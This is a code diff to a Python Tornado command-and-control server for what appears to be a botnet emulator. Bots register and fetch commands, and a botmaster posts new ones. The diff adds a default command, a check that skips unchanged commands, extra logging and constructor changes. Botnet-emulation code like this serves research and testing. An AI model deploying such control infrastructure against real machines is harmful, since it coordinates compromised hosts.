@@ -17,8 +17,6 @@ from resources import emu_config
 from utils.MiscUtils import NetworkAddressSchema
 
 
-# TODO: Remove plain text output
-
 def make_app():
     """Starts the web interface that is used to interact with this server."""
     handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
@@ -45,7 +43,7 @@ class CurrentCommandHandler(tornado.web.RequestHandler):
     """A handler that lets bots fetch the current command via HTTP GET and lets the botmaster issue a new command via
     HTTP POST."""
 
-    current_command = {}
+    current_command = {"command": "default_command", "kwargs": {}}
 
     def get(self):
         if "json" in string.lower(self.request.headers.get("Accept")):
@@ -58,15 +56,19 @@ class CurrentCommandHandler(tornado.web.RequestHandler):
                     "%s: %s" % (self.current_command["command"], " ".join(self.current_command["kwargs"].values())))
 
     def post(self):
-        old_command = self.current_command
-        # noinspection PyBroadException
-        try:
-            self.current_command["command"] = self.get_body_argument("command")
-            self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
-            logging.debug("The CnC-Server has received a new command: " % self.current_command)
-        except:
-            # rolls the change back
-            self.current_command = old_command
+        logging.debug('%s != %s == %s' % (self.get_body_argument("command"), self.current_command["command"],
+                                          self.get_body_argument("command") != self.current_command["command"]))
+        if self.get_body_argument("command") != self.current_command["command"]:
+            # noinspection PyBroadException
+            old_command = self.current_command
+            try:
+                self.current_command["command"] = self.get_body_argument("command")
+                self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
+                logging.debug("The CnC-Server has received a new command: " % self.current_command)
+            except:
+                # rolls the change back
+                logging.warning("Command could not be applied: body_arguments = %s" % self.get_body_arguments())
+                self.current_command = old_command
 
         self.set_header("Content-Type", "text/plain")
         self.write("OK")
@@ -99,8 +101,8 @@ class RegisterHandler(tornado.web.RequestHandler):
 class CnCServer(Runnable):
     """Allows the CnCServer to be run in its own thread."""
 
-    def __init__(self, name="", host="0.0.0.0", port=emu_config.PORT):
-        Runnable.__init__(self, name)
+    def __init__(self, host="0.0.0.0", port=emu_config.PORT, **kwargs):
+        Runnable.__init__(self, **kwargs)
         self.host = host
         self.port = port
 
